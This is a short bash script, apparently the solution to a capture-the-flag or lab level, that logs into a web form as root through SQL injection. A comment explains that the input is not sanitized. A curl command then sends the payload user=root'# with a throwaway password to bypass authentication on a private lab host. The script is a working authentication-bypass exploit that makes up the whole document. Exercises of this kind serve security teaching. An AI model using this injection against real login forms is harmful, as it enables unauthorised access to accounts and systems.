#! /usr/bin/env bash

# There is no input sanitizing, so it is possible to log in as root by entering 'root', then closing quotes, then
# commenting the rest of the line. The password is needed to run the login routine, so we can just assign garbage.
curl --data "user=root'#" --data "pass=a" http://10.0.23.24:8004/level01/index.php